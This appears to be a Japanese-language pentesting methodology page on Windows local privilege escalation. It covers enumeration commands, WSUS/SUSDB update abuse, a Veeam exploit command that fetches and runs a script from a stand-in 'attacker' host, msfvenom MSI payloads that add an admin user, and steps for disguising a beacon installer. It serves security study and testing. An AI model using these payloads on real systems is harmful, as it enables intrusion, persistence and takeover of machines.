# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格のベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、いくつかの基本的なガイドに基づく、Windows の権限昇格に関する一般的な方法論をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙の流れは、コミュニティのワークショップやチェックリストも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windows の権限昇格を扱った DerbyCon のプレゼンテーションも含まれています。<sup>[[5]](#references)</sup>

## Windows の基礎知識

### Access Tokens

**Windows の access token について知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity level について知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙**や実行ファイルの起動を**妨げたり、ユーザーの操作を検知したり**するさまざまな機能があります。権限昇格の列挙を始める前に、次の**ページを読んで**、これらの**防御**メカニズムをすべて**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでの UEFI NVRAM 編集を、起動前の DMA と Windows の `SYSTEM` メモリパッチ適用につなげることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess のサイレント昇格

`RAiLaunchAdminProcess` 経由で起動した UIAccess プロセスは、AppInfo の secure-path チェックを回避すると、プロンプトを表示させずに High IL に到達するために悪用できます。専用の UIAccess/Admin Protection バイパス手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播を悪用すると、任意の SYSTEM レジストリ書き込み（RegPwn）が可能になります:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証が再利用された SMB TCP 接続経由でリフレクトされる、**SMB 任意ポート**の LPE 経路も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン別エクスプロイト

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows環境が**非常に広い攻撃対象領域**を持つことがわかります。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSビルド、インストール済み更新プログラム、および候補となるアドバイザリを列挙します。結果が該当すると判断する前に、正確な製品と置き換え後の更新プログラムを確認してください。

バージョン固有のローカルエクスプロイトを使う場合は、OSのアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64ビット版Windowsでは、32ビットプロセスに[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)が適用されます。通常、`%windir%\System32`は32ビットのシステムディレクトリを指しますが、`%windir%\Sysnative`を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64ビットプロセスでは使用できません。OSビルドや未適用KBの候補が見つかっても、それだけではエクスプロイト可能であることの証明にはなりません。実行中のビルド、インストール済みまたは置き換え後の更新プログラム、プロセスのアーキテクチャ、およびエクスプロイトの前提条件を、該当する問題の[Microsoftセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

サービスのメモリ破損の例については、[クライアントが制御するMIDI共有メモリリングのオフセット](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions)を参照してください。公開されているスタックオフセットは、テストしたビルドでのみ有効です。`LOCAL SERVICE`に到達することと、その後に[SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)を使って`SYSTEM`に昇格することは別の段階です。<sup>[[44]](#references)</sup>

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**エクスプロイトのGitHubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存された認証情報やJuicy情報はありますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShellの履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell のトランスクリプトファイル

[こちら](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` 設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルをリダイレクトできます。transcript を確認する前に、実際の出力先とファイル ACL を確認してください。transcript には、認証情報を含むコマンド引数や出力が記録されている可能性があります。読み取り可能な transcript は、内容から利用可能な高い権限を持つ ID が判明し、その ID で該当するコンテキストにログオンできる場合にのみ、手掛かりとなります。

### PowerShell Module Logging

PowerShell pipeline の実行に関する詳細が記録されます。記録には、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShellログの直近15件のイベントを表示するには、次を実行します：

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行時に、その活動全体と完全な内容が記録され、コードの各ブロックが実行と同時に記録されます。このプロセスにより、各活動の包括的な監査証跡が保持され、フォレンジックや悪意ある動作の分析に役立ちます。実行時にすべての活動を記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows Event Viewer の **Application and Services Logs > Microsoft > Windows > PowerShell > Operational** にあります。\
直近の 20 件のイベントを表示するには、次のコマンドを使用します。

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

先ほどのガイダンスでは、リスクを次のように要約していました。

更新プログラムの取得に http**S** ではなく http が使われている場合、システムを compromise できる可能性があります。

HTTP の WSUS endpoint は、更新メタデータの傍受を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS server を使用しているか、攻撃者がそのトラフィックを傍受または制御できるか、さらにクライアントの更新プログラムの信頼設定とインストールポリシーにも左右されます。URL だけでは code execution が可能とは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、次のコマンドを cmd で実行し、ネットワークで非 SSL の WSUS 更新が使われているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または PowerShell で以下を実行します:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信を受け取った場合:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

元の適用条件に関する記述は次のとおりです。

その場合、**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSのエントリは無視されます。

`UseWUServer` が `1` の場合、Windows Updateは設定されたイントラネットサービスを使用します。これはHTTP interceptionの前提条件を満たすことを確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。値が `0` の場合、このポリシーで設定されたWSUSエンドポイントは選択されません。

この脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit) や [pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非SSLのWSUS通信に「偽の」更新プログラムを挿入する、weaponizedなMiTM exploit scriptsです。

調査資料はこちらです。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このバグがexploitするのは次の欠陥です。

> ローカルユーザーのプロキシを変更でき、Windows UpdateがInternet Explorerの設定で構成されたプロキシを使用する場合、PyWSUSをローカルで実行して自分の通信をinterceptし、資産上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUSサービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUSのホスト名に対する自己署名証明書を生成し、その証明書を現在のユーザーの証明書ストアに追加すれば、HTTPとHTTPSの両方のWSUS通信をinterceptできます。WSUSには、証明書のtrust-on-first-use型検証を実装するHSTSのような仕組みはありません。提示された証明書がユーザーに信頼され、正しいホスト名を持つ場合、サービスはその証明書を受け入れます。

ツール[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)を使って、この脆弱性をexploitできます（公開後）。

### WSUS管理者が制御する更新プログラム

現在のIDにWSUSサーバー上で更新プログラムを**公開および承認**する権限がある場合、別の経路が存在します。サーバーの`WSUS Administrators`グループへの実効的な所属状況と委任されたWSUS権限を確認し、承認済み更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoftの説明では、更新プログラムの承認にはWSUS Administrator権限が必要です](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)。また、[公開時の信頼関係についても説明されています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使われた証明書を信頼する必要があります。これを権限昇格の経路とみなす前に、対象となる更新プログラムに署名があり、受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTPの`WUServer`値やグループ名だけでは、これらの条件が満たされるとは限りません。

### SUSDBのカスタム更新プログラムの悪用：`.txt`/`.esd`経由の未署名ペイロード

これは、HTTP WSUS接続をinterceptする場合とは異なる信頼境界の不備です。前提条件は、カスタム更新プログラムを公開および承認するために、**WSUSデータベース（`SUSDB`）のストアドプロシージャ**へ十分なアクセス権があることです。実用的な侵入経路の1つは、上流WSUSのコンピューターアカウントを、中継先となる`SUSDB`をホストする別のMSSQLサーバーへリレーする方法です。具体的な前提条件は環境によって異なるため、SQL管理者権限があると決めつけず、まず`EXECUTE`権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUSクライアント認証をHTTP/8530からLDAP、SMB、またはAD CSへリレーする別の攻撃経路については、[WSUS HTTPを悪用したNTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 外部データベースへのrelayとプロシージャ権限を確認する

WSUSが外部SQL Serverを使用する環境では、まずWSUSサーバーアカウントがデータベースへ認証できるか、またNTLM relayがそのリスナーに到達するかを確認してください。直接のテーブル書き込みが拒否されても、サーバーのSQLロールによって更新プログラム公開用のプロシージャが利用可能な場合があります。`SUSDB`への`UPDATE`が失敗しても、公開がブロックされているとは限りません。カスタム更新プログラムを試す前に、許可されたSQLセッションで実効ID、ロールメンバーシップ、プロシージャ権限を調べてください。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

ライブのプロシージャ定義とインストール済みの `SoftwareDistributionPackage.xsd` は、有効な更新メタデータを再構成する際に役立ちます。バンドルの親とペイロードの子には、それぞれ `UpdateIdentity`（フラグメント型 `1`）、`LocalizedProperties`（`4`）、`ExtendedProperties`（`2`）が必要です。各 `spImportUpdate` 呼び出しで返されるローカルのリビジョン ID を記録し、バンドルの関連付け、ダイジェスト、サイズ、コンテンツ URL、リビジョンの整合性を保ってください。これは状態を伴う公開ワークフローであるため、ストアドプロシージャの呼び出しが 1 回成功しただけでは、クライアント側で実行された証拠にはなりません。<sup>[[38]](#references)</sup>

#### 更新をビルドし、対象を指定して承認する

カスタム更新ワークフローでは、制限付きの公開 API として正規の WSUS プロシージャを使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| 更新メタデータをインポート | `spImportUpdate` |
| 前提条件、ローカライズ、拡張 XML フラグメントを保存 | `spSaveXMLFragment` |
| コンテンツダイジェストを攻撃者が制御する URL に関連付け | `spSetBatchURL` |
| コンピューターグループを列挙／作成し、クライアントを追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループへのインストールを承認 | `@actionID = 0` と `@isAssigned = 1` を指定した `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、`CommandLineInstallation` ハンドラーは、インポートしたメタデータ／フラグメント間で一致している必要があります。コンテンツ URL と対象グループを割り当てた後の最終承認は、次のようになります。例の GUID を再利用せず、新しい更新、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUS は通常、任意の未署名の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` 内の .NET `VerifyFile` パスでは、指定されたファイル名が `.txt` または `.esd` で終わる場合、証明書チェックフラグが false に設定されます。その結果、バイト列がテキストまたは正規の ESD イメージであることを事前に確認せずに `CheckCertificateSignature` がスキップされます。したがって、たとえば `payload.exe.txt` という名前の変更されていない PE はコンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシー上の型混同バグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSは登録済みのコンテンツを取得します。配信元はBITSのHTTP要件を満たす必要があります。到達可能なURLだけでは不十分で、転送では初期の`HEAD`/`GET`フローとバイト範囲リクエストが使用されるためです。Rangeに対応していないサーバーでは、BITSにRangeプロトコルヘッダーが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、import/fragment/URL/group/deploymentの一連の処理に必要なSQLを生成し、実行用に改変されたMSSQLクライアントを含み、コンテンツのステージング用に`BitsWebServer.py`を同梱しています。認可されたラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 無人実行と再試行による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従ってインストールされます。ユーザーが手動で選択する必要はありません。テストでは、更新が失敗または未完了のままになったペイロードは、コールバックプロセスの終了後すぐに再び提示されました。そのため、再試行動作が繰り返し実行される永続化につながる可能性があります。クライアントに更新失敗の状態が表示されるため、目立ちやすい手法です。<sup>[[39]](#references)</sup>

#### 検知とハードニングの着眼点

この攻撃チェーンにおけるサーバー側およびクライアント側の有用な着眼点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査します。新しいターゲットグループ、外部コンテンツの配信元、`.txt`/`.esd` の更新ペイロード、および想定外のプリンシパル（特にコンピューターアカウント以外）による展開を調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、誤記された `FileVerficationFailed`、および `EventId=364` を確認します。拡張子だけを信用せず、検証結果をペイロードの拡張子とコンテンツのマジックナンバーに照らし合わせます。
- Windows Update のインストールが繰り返し失敗・再試行されていないか、また `.txt` または `.esd` という名前のコンテンツから PE が実行されたり、想定外の子プロセスやネットワーク動作が発生したりしていないかを調査します。
- 対応しているデータベースサービスでは Authentication の Extended Protection を必須にし、データベースへのネットワークアクセスを WSUS サーバーおよび許可された管理システムに制限します。カスタム更新手順に対する `EXECUTE` 権限を最小限にし、監査します。

## サードパーティ製自動アップデーターと Agent IPC (local privesc)

多くのエンタープライズエージェントは、localhost の IPC インターフェースと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、アップデーターが不正なルート CA や弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を配布し、SYSTEM サービスにインストールさせることができます。一般化した手法（Netskope stAgentSvc チェーン – CVE-2025-0309 に基づく）については、こちらを参照してください:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 経由で SYSTEM)

当初のバージョン固有の説明と調査メモは次のとおりです。

Veeam B&R < `11.0.1.1261` は、**TCP/9401** で localhost サービスを公開しており、攻撃者が制御するメッセージを処理することで、**NT AUTHORITY\SYSTEM** として任意のコマンドを実行できます。<sup>[[12]](#references)</sup>

- **Recon**: リスナーとバージョンを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** のコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424)には、バックアップネットワークの境界内で暗号化された構成データベースの認証情報が未認証で漏えいする問題が記載されています。また、別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が示されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にもバインドされる場合があるため、実際のアドレスと PID を確認してください。

- **Recon**: TCP/9401 を所有するプロセスが `Veeam.Backup.Service.exe` であることを確認し、インストール済み製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手がかりであり、完全なパッチ確認ではありません。
- **修正済みの最低バージョン**: Veeam は、最初の修正済みリリースとして **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** を挙げています。それ以前のリリースは影響を受けます。4 つの要素からなるファイルバージョンだけでは、同じビルド番号の未パッチのベースビルドと後続パッチを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: `VeeamHax.exe` などの PoC を必要な Veeam DLL とともに同じディレクトリに配置し、ローカルソケット経由で SYSTEM ペイロードをトリガーします。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

サービスはコマンドを SYSTEM として実行します。

引用されている PoC は、追加の前提条件が満たされる場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。

## KrbRelayUp

元のデフォルト環境の説明は次のとおりです。

特定の条件下で、Windows の **ドメイン** 環境に **ローカル権限昇格**の脆弱性が存在します。条件には、**LDAP signing が強制されていない**環境、ユーザーに **Resource-Based Constrained Delegation (RBCD)** を構成できる自己権限があること、ユーザーがドメイン内にコンピューターを作成できることが含まれます。これらの **要件**は**デフォルト設定**で満たされる点に注意してください。

ローカル Kerberos relay は、適切な COM server が認証を行い、relay されたプリンシパルが対象オブジェクトへの権限を持つ場合、低権限のログオンから特権ディレクトリ書き込みへと至る可能性があります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)には、RBCD と `msDS-KeyCredentialLink`（shadow-credential）の LDAP 書き込み方法が記載されており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD チェーンには適用可能な委任設定と対象オブジェクトへの権限が必要です。一方、shadow-credential チェーンには key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインに参加しているだけでは成立しません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、relay される ID のオブジェクト ACL、選択した COM class の認証レベルと impersonation レベルを確認してください。呼び出し元のログオンタイプと認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報を使ったログオンとは異なる挙動を示す場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムによっても結果が変わる可能性があります。ポリシーが緩い場合や ACL が一致する場合は、調査対象として扱ってください。受動的な列挙によって COM coercion、relay 認証、ディレクトリへの書き込みを発生させてはいけません。マシンアカウントの shadow credential からマシンチケットを取得できる場合がありますが、別途 DCSync を行えるのは、そのアカウントが必要なディレクトリレプリケーション権限を持つ場合に限られます。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) にある **exploit** を確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリキーが**有効**（値が **0x1**）になっている**場合**、あらゆる権限のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter セッションがある場合は、module **`exploit/windows/local/always_install_elevated`** を使用してこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用すると、権限昇格用の Windows MSI バイナリをカレントディレクトリ内に作成できます。この script は、ユーザーまたはグループの追加を求める、事前コンパイル済みの MSI installer を出力します（そのため、GIU へのアクセスが必要です）：

```
Write-UserAddMSI
```

作成した binary を実行して、privileges を昇格させます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、このチュートリアルを読んでください。**command lines** を**実行**するだけなら、「**.bat**」ファイルを wrapper にできることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で、新しい Windows EXE TCP payload を生成し、`C:\privesc\beacon.exe` に保存します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- プロジェクト名（例: **AlwaysPrivesc**）を入力し、場所に **`C:\privesc`** を指定します。**place solution and project in the same directory** を選択して、**Create** をクリックします。
- ステップ 3/4（含めるファイルの選択）が表示されるまで、**Next** をクリックします。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールしたアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、installer の実行直後に beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**build** します。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、platform が x64 に設定されていることを確認してください。

### MSI のインストール

悪意のある `.msi` ファイルの**インストール**をバックグラウンドで実行するには:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性の悪用には、次のものを使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と検出ツール

### 監査設定

これらの設定は何が**記録される**かを決めるため、注意が必要です。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログの送信先を確認することが重要です。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

